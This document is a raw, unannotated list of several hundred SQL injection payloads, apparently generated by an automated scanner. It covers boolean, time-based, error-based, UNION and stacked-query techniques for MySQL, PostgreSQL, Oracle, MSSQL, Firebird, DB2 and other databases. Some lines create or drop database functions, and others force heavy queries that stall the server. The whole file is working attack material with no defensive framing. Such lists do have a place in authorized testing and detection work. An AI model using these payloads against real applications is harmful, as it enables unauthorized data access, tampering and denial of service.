+1')) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('rggg'='rggg
+-2323\") aS ZgSn wHeRe 9274=9274 oR 3440=cAsT((cHr(113)||cHr(113)||cHr(112)||cHr(106)||cHr(113))||(sElEcT (cAsE WhEn (3440=3440) tHeN 1 ElSe 0 eNd))::TeXt||(cHr(113)||cHr(122)||cHr(118)||cHr(122)||cHr(113)) aS NuMeRiC)--
+1\"))%20as%20vbpl%20where%203885=3885%20and%206969=(select%206969%20from%20pg_sleep(5))--
+1') where 7646 = 7646 and 3580 = (select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1)) aS TbIq wHeRe 7159=7159 aNd 8635=(sElEcT CoUnT(*) fRoM GeNeRaTe_sErIeS(1,5000000))--
+1',(case when 8260 = 8260 then 1 else null end)
+-3747\") union all select 8962,8962,8962,8962,8962#
+-6158\"))) or 8571=8571--
+1')));sElEcT CoUnT(*) fRoM RdB$FiElDs aS T1,rDb$tYpEs aS T2,rDb$cOlLaTiOnS As t3,RdB$FuNcTiOnS As t4 AnD ((('PsHn' LiKe 'PsHn
+1')) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--
+1\"))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067 = 9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((\"blkt\" like \"blkt
+-5278\")))%20union%20all%20select%205264,5264,5264#
+-2102'%20where%203644=3644%20or%205023=ctxsys%2edrithsx%2esn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select%20(case%20when%20(5023=5023)%20then%201%20else%200%20end)%20from%20dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--
+-4617'))) or 9323 = 9323#
+-7786')) or 9323=9323#
+1%\"))) or 8466 = benchmark(5000000,md5(0x694a4745)) and (((\"%\" = \"
+-2797'))) uNiOn aLl sElEcT 5711#
+1';select case when 7426=6635 then 1 else null end--
+1%'%20union%20all%20select%20null#
+1' where 6116 = 6116 ; select (case when (7033 = 1594) then 7033 else 7033*(select 7033 from information_schema.character_sets) end)#
+1\")) as casz where 5921 = 5921 rlike (select * from (select(sleep(5)))vwyq)#
+-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--
+1'+(sElEcT 'xPbY' wHeRe 2724=2724;sElEcT (cAsE WhEn (9376=4521) tHeN 1 ElSe 9376*(sElEcT 9376 fRoM MaStEr..SySdAtAbAsEs) EnD)--
+1'))%20or%208384=like('abcdefg',upper(hex(randomblob(500000000%2f2))))%20and%20(('gxpr'='gxpr
+1%\"))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (((\"%\"=\"
+1%20and%20updatexml(3393,concat(0x2e,0x7171706a71,(select%20(elt(3393=3393,1))),0x717a767a71),1161)#%20dyed
+1) where 1100=1100 and sleep(5)--
+1%\"))) rlike (select (case when (4442=4476) then 1 else 0x28 end)) and (((\"%\"=\"
+1,iif(1440=4612,1,1%2f0)
+1'%20where%208469=8469;select%20(case%20when%20(4769=4769)%20then%204769%20else%204769*(select%204769%20from%20mysql%2edb)%20end)#
+-7466 wHeRe 5161=5161 oR 3038=3038
+1) as wokl where 1368=1368 union all select null,null,null,null,null,null--
+1') oR 7552=(SeLeCt cOuNt(*) FrOm rDb$fIeLdS As t1,RdB$TyPeS As t2,RdB$CoLlAtIoNs aS T3,rDb$fUnCtIoNs aS T4) AnD ('JhXh'='jHxH
+1'%20where%207014=7014%20or%208466=benchmark(5000000,md5(0x694a4745))--
+-4222') union all select 9267,9267,9267,9267,9267,9267--
+1) Or sLeEp(5) AnD (2211=2211
+1\");sElEcT CaSe wHeN 7717=7717 ThEn 1 eLsE NuLl eNd--
+1')))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((('nets' like 'nets
+1%\" or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and \"%\"=\"
+1' in boolean mode) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)#
+1\"))) or (select * from (select(sleep(5)))ydpu) and (((\"djwo\" = \"djwo
+1')%20where%208575=8575%20and%203715%20in%20((char(113)+char(113)+char(112)+char(106)+char(113)+(select%20(case%20when%20(3715=3715)%20then%20char(49)%20else%20char(48)%20end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+-2790\"))%20as%20vcvw%20where%206075=6075%20or%207078=8148--
+1))) and 9575 = 1640--
+1%'))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((('%'='
+1\") aS AwDg wHeRe 9512=9512;sElEcT (cAsE WhEn (7169=7785) tHeN 1 ElSe 7169*(sElEcT 7169 fRoM MaStEr..SySdAtAbAsEs) EnD)--
+-4427'))%20union%20all%20select%206357,6357,6357,6357,6357#
+1%\") Or 8466=BeNcHmArK(5000000,Md5(0x694a4745)) aNd (\"%\"=\"
+1%\") Or 4411=(sElEcT CoUnT(*) fRoM SySuSeRs aS SyS1,sYsUsErS As sYs2,SySuSeRs aS SyS3,sYsUsErS As sYs4,SySuSeRs aS SyS5,sYsUsErS As sYs6,SySuSeRs aS SyS7) AnD (\"%\"=\"
+1\") as fcrx where 2929=2929 and 2820=5133
+1'||(select%20'zyvk'%20from%20dual%20where%202072=2072;begin%20user_lock%2esleep(5);%20end)||'
+1%\"))) and 6055 = ctxsys.drithsx.sn(6055,(chr(113) |  | chr(113) |  | chr(112) |  | chr(106) |  | chr(113) |  | (select (case when (6055 = 6055) then 1 else 0 end) from dual) |  | chr(113) |  | chr(122) |  | chr(118) |  | chr(122) |  | chr(113))) and (((\"%\" = \"
+1')%20and%20char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1%\"))) or 8514 = benchmark(5000000,md5(0x544d5a4c))#
+1');call regexp_substring(repeat(right(char(3702),0),500000000),null)
+1) As nFgB WhErE 2503=2503 AnD RoW(6237,7469)>(SeLeCt cOuNt(*),CoNcAt(0X7171706A71,(sElEcT (eLt(6237=6237,1))),0x717a767a71,fLoOr(rAnD(0)*2))X FrOm (SeLeCt 5192 UnIoN SeLeCt 3785 UnIoN SeLeCt 3931 UnIoN SeLeCt 7158)A GrOuP By x)--
+1') where 9304 = 9304 or 6979 = like('abcdefg',upper(hex(randomblob(500000000 / 2))))--
+1'+(select sijr where 7250 = 7250 ; if(1665 = 3845) select 1665 else drop function nzod--
+1'%20or%20updatexml(1808,concat(0x2e,0x7171706a71,(select%20(elt(1808=1808,1))),0x717a767a71),8666)%20and%20'esjl'='esjl
+1\") aNd (3020=3020)*6703 AnD (\"QoWc\" LiKe \"QoWc
+-3748' WhErE 9292=9292 Or 3337=2859#
+1\")) as gprr where 5975 = 5975 and 2388 = benchmark(5000000,md5(0x6d457153))#
+1'+(sElEcT 'lPkV' wHeRe 8760=8760;iF(7899=7899) sElEcT 7899 eLsE DrOp fUnCtIoN ZbBp--
+-3707\"))) or 8571 = 8571--
+1\"))) aNd cHaR(120)||ChAr(106)||cHaR(117)||ChAr(85)=rEgExP_SuBsTrInG(RePeAt(rIgHt(cHaR(9981),0),5000000000),nUlL) aNd (((\"uQyB\"=\"UqYb
+1%\")));select (case when (8857=1512) then 8857 else 8857*(select 8857 from mysql.db) end)#
+1')%20union%20all%20select%20null,null#
+-9440\"%20union%20all%20select%205599,5599,5599,5599,5599--
+1'))%20as%20eltx%20where%209955=9955%20and%202853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select%20(case%20when%20(2853=2853)%20then%201%20else%200%20end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))%20as%20numeric)--
+1'))) ; select case when 7717 = 7717 then 1 else null end--
+1%\")%20union%20all%20select%20null,null,null--
+1,(select (case when (1609 = 1609) then waitfor delay '0:0:5' else 1609*(select 1609 from master..sysdatabases) end))
+1'||(select%20'zwcp'%20where%203333=3333;select%20(case%20when%20(7163=1777)%20then%201%20else%207163*(select%207163%20from%20master%2e%2esysdatabases)%20end)--
+1'%20where%209583=9583%20and%205319=7670#
+-2920')) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724 = 2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('rzey' = 'rzey
+1'))%20and%20(3020=3020)*6703%20and%20(('vvkd'%20like%20'vvkd
+1\"%20where%201537=1537%20and%20(select%209067%20from(select%20count(*),concat(0x7171706a71,(select%20(elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x%20from%20information_schema%2echaracter_sets%20group%20by%20x)a)--
+1')) as arhm where 3268=3268 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--
+1 where 9898=9898 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+1' procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and 'ctac' like 'ctac
+1'))%20union%20all%20select%20null,null,null,null,null,null,null--
+1'||(SeLeCt 'YbFo' FrOm dUaL WhErE 3319=3319 UnIoN AlL SeLeCt nUlL,NuLl,nUlL,NuLl,nUlL,NuLl,nUlL,NuLl#
+-9429')%20order%20by%201--
+1\") aNd sLeEp(5) AnD (\"YtOf\"=\"yToF
+1;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--
+1'%20or%20(select%20*%20from%20(select(sleep(5)))ydpu)%20and%20'iwmy'='iwmy
+1\" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and \"dtwv\" like \"dtwv
+1%'));waitfor%20delay%20'0:0:5'%20and%20(('%'='
+1');iif(1095=2853,1,1/0)
+1) as duqb where 6495=6495;select (case when (5914=2314) then 5914 else 1/(select 0) end)--
+-9111\" or 3038=3038
+1%'));select%20(case%20when%20(3855=3855)%20then%203855%20else%201%2f(select%200)%20end)--
+1 where 8905=8905 and make_set(7654=1923,1923)--
+1\") and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (\"rphs\"=\"rphs
+1%')) rlike (select * from (select(sleep(5)))sgvo) and (('%' = '
+1') aNd 6537=DbMs_pIpE.ReCeIvE_MeSsAgE(ChR(76)||cHr(116)||cHr(117)||cHr(65),5) AnD ('CpOy'='cPoY
+1)%20as%20phja%20where%204627=4627;select%20*%20from%20generate_series(4592,4592,case%20when%20(4592=4592)%20then%201%20else%200%20end)%20limit%201--
+1\"%20and%202853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select%20(case%20when%20(2853=2853)%20then%201%20else%200%20end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))%20as%20numeric)%20and%20\"ardk\"%20like%20\"ardk
+-9541 where 4291=4291 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+1%\")) or sleep(5) and ((\"%\"=\"
+1\") aNd eLt(4249=4249,7259) aNd (\"xGkA\" lIkE \"xGkA
+-6000\")%20where%201797=1797%20union%20all%20select%201797,1797,1797,1797,1797,1797,1797,1797--
+1%\")%20or%204915=(select%20count(*)%20from%20domain%2edomains%20as%20t1,domain%2ecolumns%20as%20t2,domain%2etables%20as%20t3)--
+-9581)%20as%20jkqo%20where%205200=5200%20or%206872=6872--
+1' in boolean mode) union all select null,null,null,null,null,null,null,null,null,null#
+1'||(SeLeCt 'FjLg' FrOm dUaL WhErE 9517=9517;CrEaTe oR RePlAcE FuNcTiOn sLeEp(iNt) ReTuRnS InT As '/lIb/lIbC.So.6','sLeEp' LaNgUaGe 'C' sTrIcT; sElEcT SlEeP(5)--
+1\")));sElEcT (cAsE WhEn (4666=4666) tHeN 1 ElSe 4666*(sElEcT 4666 fRoM MaStEr..SySdAtAbAsEs) EnD)--
+1' WhErE 4945=4945;CaLl rEgExP_SuBsTrInG(RePeAt(lEfT(CrYpT_KeY(ChAr(65)||ChAr(69)||ChAr(83),nUlL),0),500000000),nUlL)--
+1'+(select 'nlvq' where 7528 = 7528 or (select * from (select(sleep(5)))sddo)#
+1%\")) rlike (select (case when (4207 = 1757) then 1 else 0x28 end)) and ((\"%\" = \"
+1%')) union all select null,null#
+1%\"))%20and%20char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+-8248 oR 5903=('qQpJq'||(SeLeCt cAsE 5903 wHeN 5903 tHeN 1 ElSe 0 eNd fRoM RdB$DaTaBaSe)||'QzVzQ')
+1';select%20like('abcdefg',upper(hex(randomblob(500000000%2f2))))
+1')%20where%207541=7541;create%20or%20replace%20function%20sleep(int)%20returns%20int%20as%20'%2flib%2flibc%2eso%2e6','sleep'%20language%20'c'%20strict;%20select%20sleep(5)--
+1' in boolean mode) ; select case when 7649 = 9297 then 1 else null end--
+1')) As jNtR WhErE 5051=5051 AnD (sElEcT 9067 fRoM(SeLeCt cOuNt(*),CoNcAt(0X7171706A71,(sElEcT (eLt(9067=9067,1))),0x717a767a71,fLoOr(rAnD(0)*2))X FrOm iNfOrMaTiOn_sChEmA.ChArAcTeR_SeTs gRoUp bY X)A)--
+1'+(sElEcT 'uZaW' wHeRe 9900=9900 oR 8315=(SeLeCt cOuNt(*) FrOm sYsIbM.SyStAbLeS As t1,SySiBm.sYsTaBlEs aS T2,sYsIbM.SyStAbLeS As t3))+'
+-2323\") as zgsn where 9274 = 9274 or 3440 = cast((chr(113) |  | chr(113) |  | chr(112) |  | chr(106) |  | chr(113)) |  | (select (case when (3440 = 3440) then 1 else 0 end))::text |  | (chr(113) |  | chr(122) |  | chr(118) |  | chr(122) |  | chr(113)) as numeric)--
+1) where 7588 = 7588 or 7417 = (select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--
+1') as wnys where 6457=6457 or 8514=benchmark(5000000,md5(0x544d5a4c))#
+-9808'%20in%20boolean%20mode)%20union%20all%20select%202528,2528,2528,2528,2528,2528,2528--
+1) union all select null,null,null#
+1' In bOoLeAn mOdE) aNd 8407=(sElEcT CoUnT(*) fRoM GeNeRaTe_sErIeS(1,5000000))#
+-4056\"))) uNiOn aLl sElEcT 4363,4363,4363,4363,4363,4363,4363,4363#
+1 where 2363 = 2363 union all select null,null,null,null,null--
+1' in boolean mode) union all select null,null,null,null,null,null#
+1%')) or 2367 = (select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
+1' AnD 5556=(SeLeCt cOuNt(*) FrOm aLl_uSeRs t1,AlL_UsErS T2,aLl_uSeRs t3,AlL_UsErS T4,aLl_uSeRs t5)
+-7084%'%20union%20all%20select%205727,5727,5727,5727,5727,5727,5727,5727,5727,5727--
+1,(select%20(case%20when%20(3902=3902)%20then%20(select%20count(*)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5)%20else%201%2f(select%200%20from%20dual)%20end)%20from%20dual)
+1'+(sElEcT AhYw wHeRe 6893=6893 wAiTfOr dElAy '0:0:5'--
+-3781)%20union%20all%20select%203916,3916,3916--
+1%\") Or rOw(1045,7562)>(sElEcT CoUnT(*),cOnCaT(0x7171706a71,(SeLeCt (ElT(1045=1045,1))),0X717A767A71,FlOoR(RaNd(0)*2))x fRoM (sElEcT 8488 uNiOn sElEcT 5584 uNiOn sElEcT 3051 uNiOn sElEcT 1210)a gRoUp bY X) aNd (\"%\"=\"
+-8971' |  | (select 'smyx' where 7970 = 7970 union all select 7970,7970,7970,7970,7970,7970,7970#
+5739-5738
+1) union all select null,null,null,null--
+1))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((6062=6062
+1') aS BdEi wHeRe 9531=9531 aNd 3580=(sElEcT CoUnT(*) fRoM DoMaIn.dOmAiNs aS T1,dOmAiN.CoLuMnS As t2,DoMaIn.tAbLeS As t3)--
+-4954%\") or 5244 = 4832
+-9698')) as qnjv where 3360=3360 or make_set(9354=9354,7185)--
+1%\"))) and (3502 = 7893)*7893 and (((\"%\" = \"
+1\")) AnD (sElEcT 9067 fRoM(SeLeCt cOuNt(*),CoNcAt(0X7171706A71,(sElEcT (eLt(9067=9067,1))),0x717a767a71,fLoOr(rAnD(0)*2))X FrOm iNfOrMaTiOn_sChEmA.ChArAcTeR_SeTs gRoUp bY X)A) aNd ((\"QyCx\" LiKe \"QyCx
+1) and 4386 = utl_inaddr.get_host_address(chr(113) |  | chr(113) |  | chr(112) |  | chr(106) |  | chr(113) |  | (select (case when (4386 = 4386) then 1 else 0 end) from dual) |  | chr(113) |  | chr(122) |  | chr(118) |  | chr(122) |  | chr(113))
+1'))%20as%20njop%20where%207001=7001;begin%20user_lock%2esleep(5);%20end--
+1%';call%20regexp_substring(repeat(right(char(2385),0),500000000),null)--
+1'||(select%20'mlwj'%20from%20dual%20where%204247=4247%20and%201702=8469)||'
+1\") or 8421 = (select count(*) from generate_series(1,5000000)) and (\"ctrr\" = \"ctrr
+1%');select%20case%20when%204488=5522%20then%201%20else%20null%20end--
+-8599)) oR ElT(5628=2324,2324) AnD ((1134=1134
+1%\")) and 8312 = dbms_pipe.receive_message(chr(69) |  | chr(79) |  | chr(101) |  | chr(68),5)--
+1\"))%20or%20row(1045,7562)>(select%20count(*),concat(0x7171706a71,(select%20(elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x%20from%20(select%208488%20union%20select%205584%20union%20select%203051%20union%20select%201210)a%20group%20by%20x)%20and%20((\"aall\"%20like%20\"aall
+1'))) ; select (case when (7980 = 3703) then 7980 else 7980*(select 7980 from information_schema.character_sets) end)#
+1' in boolean mode) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393 = 3393,1))),0x717a767a71),1161)#
+-5866')) As pHzQ WhErE 3803=3803 UnIoN AlL SeLeCt 3803,3803,3803,3803,3803,3803,3803,3803--
+1%\"));sElEcT CaSe wHeN 7717=7717 ThEn 1 eLsE NuLl eNd--
+-5757%\") Or 6872=6872 aNd (\"%\"=\"
+1\") and elt(6651 = 1172,1172) and (\"zfkb\" like \"zfkb
+-7065'+(sElEcT 'bDxR' wHeRe 1756=1756 uNiOn aLl sElEcT 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#
+1')) Or 1022=(sElEcT CoUnT(*) fRoM AlL_UsErS T1,aLl_uSeRs t2,AlL_UsErS T3,aLl_uSeRs t4,AlL_UsErS T5)--
+1\") and 9198=9198--
+-8002'))) uNiOn aLl sElEcT 6647,6647,6647--
+1'+(select gblp where 6768 = 6768 ; select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--
+1'))%20rlike%20sleep(5)%20and%20(('iwct'='iwct
+1 wHeRe 4003=4003 uNiOn aLl sElEcT NuLl--
+1\")) Or (SeLeCt 2*(If((SeLeCt * fRoM (sElEcT CoNcAt(0X7171706A71,(sElEcT (eLt(8113=8113,1))),0x717a767a71,0X78))s), 8446744073709551610, 8446744073709551610))) aNd ((\"QgLe\" LiKe \"QgLe
+1'%20where%203188=3188%20and%209198=9198--
+-2725\" union all select 3671,3671,3671,3671,3671#
+1%'))) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1) Or cHaR(119)||ChAr(100)||cHaR(99)||cHaR(121)=rEgExP_SuBsTrInG(RePeAt(rIgHt(cHaR(1441),0),5000000000),nUlL)--
+-4480')%20where%204661=4661%20or%201570=convert(int,(select%20char(113)+char(113)+char(112)+char(106)+char(113)+(select%20(case%20when%20(1570=1570)%20then%20char(49)%20else%20char(48)%20end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+-4835))) Or (4219=2081)*2081 AnD (((8536=8536
+1')));begin%20user_lock%2esleep(5);%20end--
+1'))%20and%205556=(select%20count(*)%20from%20all_users%20t1,all_users%20t2,all_users%20t3,all_users%20t4,all_users%20t5)%20and%20(('ekla'='ekla
+-7624') oR 5903=('qQpJq'||(SeLeCt cAsE 5903 wHeN 5903 tHeN 1 ElSe 0 eNd fRoM RdB$DaTaBaSe)||'QzVzQ') AnD ('IwAb'='iWaB
+1') aS YuQv wHeRe 6007=6007 oR ExTrAcTvAlUe(1297,CoNcAt(0X5C,0x7171706a71,(SeLeCt (ElT(1297=1297,1))),0X717A767A71))--
+1'))) and 8514 = (select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('zoxm' like 'zoxm
+1%') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ('%'='
+1'||(select 'fwph' where 3791=3791;select like('abcdefg',upper(hex(randomblob(500000000/2))))--
+1')) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173 = 9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('pqxe' like 'pqxe
+1'));select benchmark(5000000,md5(0x4c4d6142)) and (('xcxr' like 'xcxr
+1,(select%20(case%20when%20(4828=2600)%20then%201%20else%201%2f(select%200)%20end))
+1'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715 = 3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('yxpi' = 'yxpi
+1' |  | (select 'ydvg' from dual where 7108 = 7108 ; select sleep(5)#
+1));select%20(case%20when%20(4666=4666)%20then%201%20else%204666*(select%204666%20from%20master%2e%2esysdatabases)%20end)--
+1') where 4786=4786 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--
+1') as irsh where 4973=4973 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
+1' AnD (sElEcT 9067 fRoM(SeLeCt cOuNt(*),CoNcAt(0X7171706A71,(sElEcT (eLt(9067=9067,1))),0x717a767a71,fLoOr(rAnD(0)*2))X FrOm iNfOrMaTiOn_sChEmA.ChArAcTeR_SeTs gRoUp bY X)A) aNd 'LyWy' LiKe 'LyWy
+-1549') or 4144 = (select upper(xmltype(chr(60) |  | chr(58) |  | chr(113) |  | chr(113) |  | chr(112) |  | chr(106) |  | chr(113) |  | (select (case when (4144 = 4144) then 1 else 0 end) from dual) |  | chr(113) |  | chr(122) |  | chr(118) |  | chr(122) |  | chr(113) |  | chr(62))) from dual) and ('fnwx' = 'fnwx
+1')) and elt(4249 = 4249,7259) and (('xjns' = 'xjns
+1',(case%20when%208260=8260%20then%201%20else%20null%20end)
+1 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))# couj
+1'))) and 6414 = (select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('msjw' like 'msjw
+1) and 8635 = (select count(*) from generate_series(1,5000000))--
+1')%20and%208514=(select%20count(*)%20from%20domain%2edomains%20as%20t1,domain%2ecolumns%20as%20t2,domain%2etables%20as%20t3)
+1\")) as frsd where 6475 = 6475 union all select null,null,null,null,null,null,null,null,null,null--
+1'+(select 'ycvl' where 8415=8415 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--
+1\")))%20union%20all%20select%20null,null,null,null,null,null,null--
+1')%20or%20char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)
+1) and (7557=1711)*1711 and (5157=5157
+1;(select * from (select(sleep(5)))srmq)-- mmjk
+1') waitfor delay '0:0:5'
+1) as rlft where 1670=1670 waitfor delay '0:0:5'--
+1) where 7096=7096;begin user_lock.sleep(5); end--
+1,(select (case when (3902 = 3902) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1 / (select 0 from dual) end) from dual)
+1') aNd 6240=('QqPjQ'||(sElEcT CaSe 6240 WhEn 6240 ThEn 1 eLsE 0 EnD FrOm rDb$dAtAbAsE)||'qZvZq') aNd ('oHqS' lIkE 'oHqS
+-4005' where 3963 = 3963 or elt(1032 = 1032,3623)--
+1%\" or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and \"%\"=\"
+1,(select (case when (4828 = 2600) then 1 else 1 / (select 0) end))
+1'+(select xzse where 4530=4530;(select * from (select(sleep(5)))srmq))+'
+1'))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('gucd'='gucd
+-2190') where 8890 = 8890 union all select 8890,8890#
+1\" where 1920 = 1920 and 8635 = (select count(*) from generate_series(1,5000000))--
+1\"))) aNd 9660=(sElEcT CoUnT(*) fRoM AlL_UsErS T1,aLl_uSeRs t2,AlL_UsErS T3,aLl_uSeRs t4,AlL_UsErS T5)--
+1))) UnIoN AlL SeLeCt nUlL,NuLl,nUlL,NuLl,nUlL,NuLl,nUlL,NuLl--
+1%')))%20and%203707=(select%20count(*)%20from%20sysibm%2esystables%20as%20t1,sysibm%2esystables%20as%20t2,sysibm%2esystables%20as%20t3)%20and%20((('%'='
+1)%20as%20wuio%20where%205312=5312%20or%207552=(select%20count(*)%20from%20rdb$fields%20as%20t1,rdb$types%20as%20t2,rdb$collations%20as%20t3,rdb$functions%20as%20t4)--
+1') wHeRe 5280=5280 aNd 4595=4595#
+-7277))) OrDeR By 1#
+1%\");(select%20*%20from%20(select(sleep(5)))acdk)#
+1'||(select%20'uedk'%20where%204655=4655;waitfor%20delay%20'0:0:5')||'
+1%')) uNiOn aLl sElEcT NuLl,nUlL,NuLl,nUlL,NuLl,nUlL,NuLl,nUlL,NuLl,nUlL--
+1'));(select * from (select(sleep(5)))srmq) and (('stea'='stea
+-3729')) or elt(4482=2648,2648) and (('vkkr' like 'vkkr
+1)) as oqyo where 7995=7995;select pg_sleep(5)--
+1\") where 2873 = 2873 or 7417 = (select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--
+-4543\") oR 3038=3038
+-7580')) as mmqt where 3468=3468 union all select 3468,3468,3468,3468,3468,3468#
+1%20where%209404=9404;select%20*%20from%20generate_series(4592,4592,case%20when%20(4592=4592)%20then%201%20else%200%20end)%20limit%201--
+-6305\"))) oR 8097=2048 AnD (((\"EuYy\" LiKe \"EuYy
+1) as usnn where 3201 = 3201 ; select pg_sleep(5)--
+1;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual# gnga
+1') as wquy where 2518 = 2518 ; select sleep(5)#
+1')%20as%20uytv%20where%207875=7875%20or%207417=(select%20count(*)%20from%20sysibm%2esystables%20as%20t1,sysibm%2esystables%20as%20t2,sysibm%2esystables%20as%20t3)--
+-8382\")) OrDeR By 1--
+1') wHeRe 4729=4729;sElEcT LiKe('AbCdEfG',uPpEr(hEx(rAnDoMbLoB(500000000/2))))--
+-8038'))%20or%20elt(1032=1032,3623)%20and%20(('xfyq'='xfyq
+-7060')%20or%20make_set(4233=1689,1689)%20and%20('twpr'%20like%20'twpr
+-4259')) As uSqU WhErE 5419=5419 Or eLt(8325=8837,8837)--
+1' and char(120) |  | char(106) |  | char(117) |  | char(85) = regexp_substring(repeat(right(char(9981),0),5000000000),null) and 'egye' = 'egye
+1%\")) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((\"%\"=\"
+-7442)%20or%203391=7492
+-8612\")%20or%204043=3083%20and%20(\"pjzo\"%20like%20\"pjzo
+1%' or elt(5873 = 5873,sleep(5))#
+1%\" ; select (case when (3539 = 8768) then 3539 else cast(1 as int) / (select 0 from dual) end) from dual--
+1'))) aNd cHaR(111)||ChAr(77)||ChAr(121)||cHaR(88)=ReGeXp_sUbStRiNg(rEpEaT(LeFt(cRyPt_kEy(cHaR(65)||cHaR(69)||cHaR(83),NuLl),0),500000000),NuLl) AnD ((('KpSg' LiKe 'KpSg
+1');sElEcT SlEeP(5)#
+1 wHeRe 3357=3357 aNd (9492=4334)*4334--
+1) or 8156=(select count(*) from generate_series(1,5000000))--
+1'||(select%20'xjtq'%20from%20dual%20where%205719=5719%20or%208315=(select%20count(*)%20from%20sysibm%2esystables%20as%20t1,sysibm%2esystables%20as%20t2,sysibm%2esystables%20as%20t3))||'
+1\"%20or%20exp(~(select%20*%20from%20(select%20concat(0x7171706a71,(select%20(elt(6270=6270,1))),0x717a767a71,0x78))x))%20and%20\"pnub\"=\"pnub
+1\" and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)
+1'+(select 'zugq' where 9218=9218;select * from generate_series(7536,7536,case when (7536=7523) then 1 else 0 end) limit 1--
+1')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('adnz'='adnz
